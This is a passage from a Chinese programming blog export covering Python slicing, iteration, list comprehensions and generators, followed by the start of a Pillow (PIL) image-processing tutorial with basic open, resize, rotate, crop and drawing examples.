<h3 id="切片和列表生成式："><a href="#切片和列表生成式：" class="headerlink" title="切片和列表生成式："></a>切片和列表生成式：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [<span class="string">'Tom'</span>, <span class="string">'Jerry'</span>, <span class="string">'阿福'</span>, <span class="string">'lanlanlu'</span>]</div></pre></td></tr></table></figure>
<p>对于这样的一个列表，我们需要取前三个元素应该怎么操作呢：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#第一种当然可以使用传统的方式</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[ L[<span class="number">0</span>], L[<span class="number">1</span>], L[<span class="number">2</span>] ]</div><div class="line">[<span class="string">'Tom'</span>, <span class="string">'Jerry'</span>, <span class="string">'阿福'</span>]</div><div class="line"><span class="comment">#或者使用循环的方式</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = []</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>n = <span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line"><span class="meta">... </span>    r.append(L[i])</div></pre></td></tr></table></figure>
<p>对这种经常取指定索引范围的操作用循环非常的繁琐，在学习完切片(Slice)之后我们会使用更简单的方式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line">[<span class="string">'Tom'</span>, <span class="string">'Jerry'</span>, <span class="string">'阿福'</span>]</div></pre></td></tr></table></figure>
<p><code>L[0:3]</code>表示，从索引<code>0</code>开始取，直到索引<code>3</code>为止，但不包括索引<code>3</code>。即索引<code>0</code>，<code>1</code>，<code>2</code>，正好是3个元素。如果第一个元素就是0，还可以省略为<code>L[:3]</code>。这个时候我们又有新的需求了，需要倒数两个元素：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L[<span class="number">-2</span>:]</div><div class="line">[<span class="string">'阿福'</span>, <span class="string">'lanlanlu'</span>]</div></pre></td></tr></table></figure>
<p>切片还有一个操作就是可以选择取出的间隔，也就是第三个参数，这是一个缺省参数，默认是1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L[::<span class="number">2</span>]</div><div class="line">[<span class="string">'Jerry'</span>, <span class="string">'lanlanlu'</span>]</div></pre></td></tr></table></figure>
<p>以上的这种操作在很多语言都需要借助函数来完成，而在python中只要切片一个操作即可，一行代码就可以完成其他语言很多行才能完成的操作。接下来再来说一下python的迭代，在很多语言如C或者java中，迭代是通过下标来完成的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">1</span> ; i &lt; <span class="keyword">sizeof</span>(arr)/<span class="number">4</span> ; i++ )&#123;</div><div class="line">    sum += arr[i];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看出，Python的<code>for</code>循环抽象程度要高于C的<code>for</code>循环，因为Python的<code>for</code>循环不仅可以用在list或tuple上，还可以作用在其他可迭代对象上。</p>
<p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，这种特性被称作鸭子类型(walk likes a duck, eat like a duck ,then that’s a duck)，当然这种特性对于Python，Ruby，Lisp的程序员来说只是很正常的特性罢了。下面举个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">d = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</div><div class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</div><div class="line">  print(key)</div></pre></td></tr></table></figure>
<p>因为dict的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</p>
<p>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</p>
<p>由于字符串也是可迭代对象，因此，也可以作用于for循环：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">"ABC"</span>:</div><div class="line">  print(ch)</div></pre></td></tr></table></figure>
<p>这就是鸭子类型，当我们在迭代的时候，只要作用一个可迭代对象即可，并不需要太关心对象究竟是什么类型，我们可以通过collections模块中的Iterable类型来判断：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(<span class="string">'abc'</span>, Iterable) <span class="comment"># str是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], Iterable) <span class="comment"># list是否可迭代</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(<span class="number">123</span>, Iterable) <span class="comment"># 整数是否可迭代</span></div><div class="line"><span class="keyword">False</span></div></pre></td></tr></table></figure>
<p>如果我们一定想要实现C语言中的那种下标循环也是可以的，我们可以将list变成索引-元素对的形式，再对它们同时迭代：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">'Tom'</span>, <span class="string">'Jerry'</span>, <span class="string">'lanlanlu'</span>]):</div><div class="line">  print(i, value)</div></pre></td></tr></table></figure>
<p>这个时候我们会发现生成列表也是一件很麻烦的事情，虽然生成1-100的顺序数我们可以通过<code>range</code>来实现，如果我们有更复杂的要求如生成<code>[1x1, 2x2...]</code>，就需要用到列表生成式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">100</span>)]</div><div class="line"><span class="comment">#这样相比于去循环简单了许多</span></div></pre></td></tr></table></figure>
<p>我们还可以使用二层循环，并且加上判断，这样就可以完全代替了冗长的for循环语法了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[m+n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABCDEFG'</span> <span class="keyword">if</span> m !=<span class="string">'D'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'!@$#%^*&amp;'</span> <span class="keyword">if</span> n != <span class="string">'^'</span>]</div><div class="line">[<span class="string">'A!'</span>, <span class="string">'A@'</span>, <span class="string">'A$'</span>, <span class="string">'A#'</span>, <span class="string">'A%'</span>, <span class="string">'A*'</span>, <span class="string">'A&amp;'</span>, <span class="string">'B!'</span>, <span class="string">'B@'</span>, <span class="string">'B$'</span>, <span class="string">'B#'</span>, <span class="string">'B%'</span>, <span class="string">'B*'</span>, <span class="string">'B&amp;'</span>, <span class="string">'C!'</span>, <span class="string">'C@'</span>, <span class="string">'C$'</span>, <span class="string">'C#'</span>, <span class="string">'C%'</span>, <span class="string">'C*'</span>, <span class="string">'C&amp;'</span>, <span class="string">'E!'</span>, <span class="string">'E@'</span>, <span class="string">'E$'</span>, <span class="string">'E#'</span>, <span class="string">'E%'</span>, <span class="string">'E*'</span>, <span class="string">'E&amp;'</span>, <span class="string">'F!'</span>, <span class="string">'F@'</span>, <span class="string">'F$'</span>, <span class="string">'F#'</span>, <span class="string">'F%'</span>, <span class="string">'F*'</span>, <span class="string">'F&amp;'</span>, <span class="string">'G!'</span>, <span class="string">'G@'</span>, <span class="string">'G$'</span>, <span class="string">'G#'</span>, <span class="string">'G%'</span>, <span class="string">'G*'</span>, <span class="string">'G&amp;'</span>]</div></pre></td></tr></table></figure>
<p>还可以通过列表生成式将列表中的字母换成小写或者转换写法等等操作，根据需求可以灵活的调整。</p>
<h3 id="生成器和迭代器"><a href="#生成器和迭代器" class="headerlink" title="生成器和迭代器"></a>生成器和迭代器</h3><p>最后介绍的一点就是生成器和迭代器了，关于生成器(generator)要记住的只有一点就是一般函数是顺序执行，遇到<code>return</code>语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用<code>next()</code>的时候执行，遇到<code>yield</code>语句返回，再次执行时从<strong>上次</strong>返回的<code>yield</code>语句处继续执行，for循环的本质就是在不断的调用<code>next()</code>函数。</p>
<p>而关于迭代器，我们可以了解到所有可以被<code>nex()</code>函数不断调用并返回下一个值的都是一个迭代器。这里有一个误区，那就是诸如list、tuple之类的虽然是可迭代对象，但不是迭代器。那么这是为什么呢</p>
<p>这是因为Python的<code>Iterator</code>对象表示的是一个数据流，Iterator对象可以被<code>next()</code>函数调用并不断返回下一个数据，直到没有数据时抛出<code>StopIteration</code>错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过<code>next()</code>函数实现按需计算下一个数据，所以<code>Iterator</code>的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p>
<p><code>Iterator</code>甚至可以表示一个无限大的数据流，例如全体自然数。而使用list是永远不可能存储全体自然数的。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>凡是可以作用于<code>for</code>循环的都是可迭代对象</li>
<li>凡是可作用于<code>next()</code>函数的对象都是迭代器类型，它们表示一个惰性计算的序列。</li>
<li>集合数据类型如<code>list</code>、<code>dict</code>、<code>str</code>等是<code>Iterable</code>但不是<code>Iterator</code>，不过可以通过<code>iter()</code>函数获得一个<code>Iterator</code>对象。</li>
<li>for循环的实质就是在不断的调用<code>next()</code>函数，下面举个例子：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ,<span class="number">4</span>]:</div><div class="line">  <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>实际上可以完全等价于：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#首先进行一次转换获得迭代器对象</span></div><div class="line">it = iter([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ,<span class="number">4</span>])</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  <span class="keyword">try</span>:</div><div class="line">    x = next(it)</div><div class="line">  <span class="keyword">except</span> StopIteration:</div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 关键字参数 可变参数 lamada表达式 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PIL学习(一)]]></title>
      <url>/2017/10/30/PIL%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>突破script kid的境界了～离解锁脚本大师的成就又近一步</p>
<a id="more"></a>
<h2 id="0x00-前言-amp-PIL介绍和安装"><a href="#0x00-前言-amp-PIL介绍和安装" class="headerlink" title="0x00-前言&amp;PIL介绍和安装"></a>0x00-前言&amp;PIL介绍和安装</h2><p>在对于隐写术的学习的同时我们也了解到了许多图像学的知识,虽然诸如<code>binwalk</code>、<code>stegsolve</code>、<code>stegdetect</code>这样的工具对我们的解题的帮助非常大，但是从博客中也不难看到，有很多题目是通过python的脚本去生成二维码或者提取图像的最低位，这个时候工具的帮助也是有限的，熟练的编写这样的脚本就成为了一个优秀的CTFer的基本素养。现在就让我们一起来进行PIL库的学习吧～</p>
<p>Pillow是Python里的图像处理库（PIL：Python Image Library），提供了了广泛的文件格式支持，强大的图像处理能力，主要包括图像储存、图像显示、格式转换以及基本的图像处理操作等。</p>
<p>虽然本篇介绍的是 PIL，但实际上安装的却是 Pillow。PIL 的更新速度很慢，而且存在一些难以配置的问题，不推荐使用；而 Pillow 库则是 PIL 的一个分支，维护和开发活跃，Pillow 兼容 PIL 的绝大多数语法，推荐使用。</p>
<p>在Mac上可以先使用Homebrew安装python3,然后再使用pip安装pillow模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 install Pillow</div></pre></td></tr></table></figure>
<p>安装好之后，打开 Python 解释器，输入 <code>from PIL import Image</code> 来测试是否安装成功。</p>
<p>⚠️注意：有一些教程默认是用import Image的，但是在window 的64位系统中如果没有在cmd中执行pip install PIL是找不到Image模块的，所以呢必须先安装Pillow，在cmd中运行pip install Pillow，这里也要变成from PIL import Image</p>
<hr>
<h2 id="0x01-Image模块"><a href="#0x01-Image模块" class="headerlink" title="0x01-Image模块"></a>0x01-Image模块</h2><p>Image可以说是PIL中最重要的一个模块了，它可以用作创建图片对象，并进行一些图像的基本操作。</p>
<h3 id="读取和存储操作"><a href="#读取和存储操作" class="headerlink" title="读取和存储操作"></a>读取和存储操作</h3><ol>
<li>PIL的open()函数用于创建PIL对象，比如读取一张图片：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div></pre></td></tr></table></figure>
<ol>
<li>存储图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"><span class="comment">#生成缩略图</span></div><div class="line">img.thumbnail((<span class="number">128</span>,<span class="number">128</span>))</div><div class="line"></div><div class="line"><span class="comment">#保存图片</span></div><div class="line">img.save(<span class="string">'test1.jpg'</span>, <span class="string">'JPEG'</span>)</div></pre></td></tr></table></figure>
<h3 id="生成新的图像"><a href="#生成新的图像" class="headerlink" title="生成新的图像"></a>生成新的图像</h3><p>Image的new方法用来生成新的图像，下面是他的定义</p>
<blockquote>
<p>Image.new(mode,size) ⇒ image</p>
<p> Image.new(mode, size, color) ⇒ image</p>
</blockquote>
<p>使用给定的变量mode和size生成新的图像。Size是给定的宽/高二元组，这是按照像素数来计算的。对于单通道图像，变量color只给定一个值；对于多通道图像，变量color给定一个元组（每个通道对应一个值）。在版本1.1.4及其之后，用户也可以用颜色的名称，比如给变量color赋值为“red”。如果没有对变量color赋值，图像内容将会被全部赋值为0（图像即为黑色）。如果变量color是空，图像将不会被初始化，即图像的内容全为0。这对向该图像复制或绘制某些内容是有用的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>im= Image.new(<span class="string">"RGB"</span>, (<span class="number">128</span>, <span class="number">128</span>), <span class="string">"red"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>im.show()</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%886.47.31.png" alt="屏幕快照 2017-10-30 下午6.47.31.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午6.47.31.png</p>
            </figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>im= Image.new(<span class="string">"RGB"</span>, (<span class="number">128</span>, <span class="number">128</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>im.show()</div></pre></td></tr></table></figure>
<p>图像im为128x128大小的黑色图像，因为变量color不赋值的话，图像内容被设置为0，即黑色。</p>
<h3 id="图像的一些基本操作"><a href="#图像的一些基本操作" class="headerlink" title="图像的一些基本操作"></a>图像的一些基本操作</h3><ol>
<li>输出图片的信息（格式、尺寸以及图像类型）</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"></div><div class="line"><span class="comment">#输出信息</span></div><div class="line">print(img.format, img.size, img.mode)</div></pre></td></tr></table></figure>
<ol>
<li>显示图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"></div><div class="line">img.show()</div></pre></td></tr></table></figure>
<ol>
<li>旋转图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"><span class="comment">#逆时针旋转45度</span></div><div class="line">rorate1 = img.rotate(<span class="number">45</span>)</div><div class="line">rorate1.show()</div><div class="line"><span class="comment"># 逆时针旋转90</span></div><div class="line">rorate2 = img.transpose(Image.ROTATE_90)</div><div class="line">rorate2.show()</div></pre></td></tr></table></figure>
<p>⚠️：只有选择90度，180度以及270度的时候才能用img.transpose(Image.ROTATE_90)，其他角度用rotate，就像iOS中的tranform方法一样，可以类比一下。</p>
<ol>
<li>缩放图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 缩放图片为50*50</span></div><div class="line">resize1 = img.resize((<span class="number">50</span>, <span class="number">50</span>))</div><div class="line">resize1.show()</div></pre></td></tr></table></figure>
<ol>
<li>生成缩略图</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"><span class="comment">#生成缩略图</span></div><div class="line">img.thumbnail((<span class="number">128</span>,<span class="number">128</span>))</div><div class="line"></div><div class="line">img.show()</div></pre></td></tr></table></figure>
<p>那么这个时候一定会有人心生疑虑了，这个生成缩略图和缩放图片到底有什么区别呢，根据代码和代码注释, 这两个函数都是对图片进行缩放, 两者的主要区别如下:</p>
<ul>
<li><code>resize()</code>函数会返回一个Image对象, <code>thumbnail()</code>函数返回None</li>
<li><code>resize()</code>修改后的图片在返回的Image中, 而原图片没有被修改; <code>thumbnail()</code>直接对内存中的原图进行了修改, 但是修改需要保存</li>
<li><code>resize()</code>中的size参数直接设定了resize之后图片的规格, 而<code>thumbnail()</code>中的size参数则是设定了x/y上的最大值. 也就是说, 经过<code>resize()</code>处理的图片可能会被拉伸, 而经过<code>thumbnail()</code>处理的图片不会被拉伸</li>
<li><code>thumbnail()</code>函数内部调用了<code>resize()</code>, 可以认为<code>thumbnail()</code>是对<code>resize()</code>的一种封装</li>
</ul>
<ol>
<li>图片灰度化</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line">grey = img .convert(<span class="string">'L'</span>)</div><div class="line">grey.show()</div></pre></td></tr></table></figure>
<ol>
<li>某个像素点的获取和修改</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"><span class="comment">#打印某个像素点的值</span></div><div class="line">print(img.getpixel((<span class="number">100</span>,<span class="number">100</span>)))</div><div class="line"><span class="comment">#更改像素点的值</span></div><div class="line">img.putpixel((<span class="number">100</span>, <span class="number">100</span>),(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</div></pre></td></tr></table></figure>
<ol>
<li>裁剪图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"></div><div class="line"><span class="comment">#裁剪图片，box为裁剪图片的区域范围</span></div><div class="line">box = (<span class="number">100</span>, <span class="number">100</span>, <span class="number">250</span>, <span class="number">250</span>)</div><div class="line">region = img.crop(box)</div><div class="line">region.show()</div></pre></td></tr></table></figure>
<ol>
<li>粘贴图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> PIl <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">img = Image.open(<span class="string">'test.jpg'</span>)</div><div class="line"><span class="comment"># 裁剪图片  box为裁剪图片的区域范围</span></div><div class="line">box = (<span class="number">100</span>, <span class="number">100</span>, <span class="number">250</span>, <span class="number">250</span>)</div><div class="line">region = img.crop(box)</div><div class="line">region.show()</div><div class="line"></div><div class="line"><span class="comment"># 逆时针旋转图片180度</span></div><div class="line">region2 = region.transpose(Image.ROTATE_180)</div><div class="line">region2.show()</div><div class="line"></div><div class="line"><span class="comment"># 图片的粘贴</span></div><div class="line">img.paste(region2, box)</div><div class="line">img.show()</div></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>从上述的方法中我们可以看到Image模块已然可以满足我们的基本需求，但是如果我们需要有更高的要求，可以使用Matplotlib类库，它具有比PIL更加强大的绘图功能，比如说绘制条状图，饼状图，散点图等。</p>
<p>其实Image中还有许多方法没有讲述，留待补充。</p>
<hr>
<h2 id="0x02-ImageDraw模块"><a href="#0x02-ImageDraw模块" class="headerlink" title="0x02-ImageDraw模块"></a>0x02-ImageDraw模块</h2><p>ImageDraw模块提供了对图像对象的简单2D绘制，用户可以通过这个模块创建新的图像，为web应用实战产生各类的图形，但其实还有更高级的绘图库<a href="http://effbot.org/zone/aggdraw-index.htm" target="_blank" rel="external">The aggdraw Module</a></p>
<p>ImageDraw绘图接口使用的是和PIL一样的坐标系统，下面就来说一下ImageDraw模块中的函数。</p>
<h3 id="ImageDraw中的函数"><a href="#ImageDraw中的函数" class="headerlink" title="ImageDraw中的函数"></a>ImageDraw中的函数</h3><blockquote>
<p>Draw方法：Draw(image) =&gt; Draw instance</p>
</blockquote>
<p>含义：创建一个可以在给定图像上绘图的对象，图像的内容会被修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw, Image</div><div class="line">im = Image.open(<span class="string">"test.jpg"</span>)</div><div class="line">draw = ImageDraw.Draw(im)</div><div class="line">draw.line((<span class="number">0</span>, <span class="number">0</span>)+im.size, fill = <span class="number">128</span>)</div><div class="line">draw.line((<span class="number">0</span>,im01.size[<span class="number">1</span>], im.size[<span class="number">0</span>], <span class="number">0</span>), fill = <span class="number">128</span>)</div><div class="line">im.show()</div><div class="line"><span class="keyword">del</span> draw</div></pre></td></tr></table></figure>
<p>在图片上绘制了两条灰色的对角线，如下图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8B%E5%8D%8810.11.14.png" alt="屏幕快照 2017-10-30 下午10.11.14.png" title="" class="">
                <p>屏幕快照 2017-10-30 下午10.11.14.png</p>
            </figure>
<h3 id="ImageDraw模块中的方法"><a href="#ImageDraw模块中的方法" class="headerlink" title="ImageDraw模块中的方法"></a>ImageDraw模块中的方法</h3><ol>
<li>Arc</li>
</ol>
<p>定义：draw.arc(xy, start, end, options)</p>
<p>含义：在给定的区域内，在开始和结束角度之间绘制一条弧（圆的一部分）。</p>
<p>变量options中fill设置弧的颜色。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</div><div class="line">im01 = Image.open(<span class="string">"test.jpg"</span>)</div><div class="line">draw =ImageDraw.Draw(im01)</div><div class="line">draw.arc((<span class="number">0</span>,<span class="number">0</span>,<span class="number">200</span>,<span class="number">200</span>),<span class="number">0</span>, <span class="number">90</span>, fill = (<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</div><div class="line">draw.arc((<span class="number">300</span>,<span class="number">300</span>,<span class="number">500</span>,<span class="number">500</span>), <span class="number">0</span>, <span class="number">-90</span>, fill = (<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>))</div><div class="line">draw.arc((<span class="number">200</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">300</span>),<span class="number">-90</span>, <span class="number">0</span>, fill = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>))</div><div class="line">im01.show()</div><div class="line"><span class="keyword">del</span> draw</div></pre></td></tr></table></figure>
<ol>
<li>Chord</li>
</ol>
<p>定义：draw.chord(xy,start, end, options)</p>
<p>含义：和方法arc()一样，但是使用直线连接起始点。</p>
<p>变量options的outline给定弦轮廓的颜色。Fill给定弦内部的颜色。</p>
<p>例子：</p>
